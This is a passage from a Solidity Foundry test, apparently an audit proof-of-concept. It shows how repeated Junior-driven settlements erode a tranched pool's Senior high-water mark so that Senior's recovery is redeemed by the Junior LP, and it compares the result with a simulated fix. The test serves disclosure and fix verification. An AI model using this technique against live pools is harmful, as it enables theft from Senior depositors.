        console2.log("  LP epoch settlements before recovery", o.settles);
        _usd("  Senior high-water mark after settlements", o.hwmAfterSettles);
        _usd("  Senior principal after settlements", o.seniorPrincipalAfterSettles);
        _usd("  pool cash at 1.99", o.poolCashAtSpike);
        _usd("  pool cash at 1.00", o.poolCashAtRecovery);
        _usd("  Senior value after recovery", o.seniorValue);
        _usd("  Junior value after recovery", o.juniorValue);
        _usd("  USDG the Junior LP redeems", o.juniorRedeemedUsdg);
    }

    function _usd(
        string memory label,
        uint256 v
    ) internal pure {
        string memory frac = vm.toString(v % 1e6);
        while (bytes(frac).length < 6) {
            frac = string.concat("0", frac);
        }
        console2.log(string.concat(label, ": ", vm.toString(v / 1e6), ".", frac));
    }

    // ------------------------------------------------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------------------------------------------------

    /// @notice Main result. Three Junior-driven settlements lower the Senior mark with no new cash; when the price
    ///         recovers, Senior's protected recovery is credited to Junior and redeemed. Compared with a single
    ///         settlement and with the proposed fix, both from the same EVM snapshot.
    function test_RepeatedSettles_MoveSeniorRecoveryToJunior() public {
        _fillAndSpike();
        uint256 hwmPreWipe = pool.seniorHighWaterMark();
        _usd("Senior high-water mark before the recapitalization (pre-wipe)", hwmPreWipe);
        uint256 x = _recapitalizeAndClear();
        uint256 d = _distributable();
        _usd("distributable D at 1.99", d);
        assertLt(d, x, "recapitalization exceeds the distributable");

        uint256 snap = vm.snapshotState();
        console2.log("--- one settlement");
        Outcome memory single = _run(1, false, hwmPreWipe);
        vm.revertToState(snap);
        console2.log("--- three settlements");
        Outcome memory repeated = _run(3, false, hwmPreWipe);
        vm.revertToState(snap);
        console2.log("--- three settlements, fix simulated");
        Outcome memory fixed_ = _run(3, true, hwmPreWipe);

        _logOutcome("ONE SETTLEMENT", single);
        _logOutcome("THREE SETTLEMENTS (bug)", repeated);
        _logOutcome("THREE SETTLEMENTS, FIX SIMULATED", fixed_);
        _usd("Senior value moved to Junior vs fix", fixed_.seniorValue - repeated.seniorValue);

        // Bug 2: the first bootstrap discards the pre-wipe mark.
        assertEq(single.hwmAfterSettles, x, "first settlement sets H to X, discarding the pre-wipe mark");
        assertLt(single.hwmAfterSettles, hwmPreWipe, "pre-wipe Senior entitlement lost");
        // Bug 1: each further settlement lowers H by D while Senior principal and pool cash stay the same.
        assertEq(repeated.settles, 3, "three settlements");
        assertEq(repeated.hwmAfterSettles, x - 2 * d, "H decays X -> X - D -> X - 2D");
        assertEq(repeated.seniorPrincipalAfterSettles, single.seniorPrincipalAfterSettles, "Senior principal unchanged");
        assertEq(repeated.poolCashAtSpike, single.poolCashAtSpike, "no new cash");
        assertEq(repeated.poolCashAtRecovery, repeated.poolCashAtSpike, "deficit was purely mark-to-market");
        // Consequence: the recovery is credited to Junior and redeemed.
        assertLt(repeated.seniorValue, single.seniorValue, "more settlements leave Senior with less");
        assertGt(repeated.juniorValue, single.juniorValue, "and Junior with more");
        assertEq(fixed_.seniorValue, hwmPreWipe, "with the fix Senior is restored to its pre-wipe mark");
        assertGt(fixed_.seniorValue, repeated.seniorValue, "bug leaves Senior short of its entitlement");
        assertGt(repeated.juniorRedeemedUsdg, fixed_.juniorRedeemedUsdg, "Junior LP redeems the shifted value");
    }

}
```

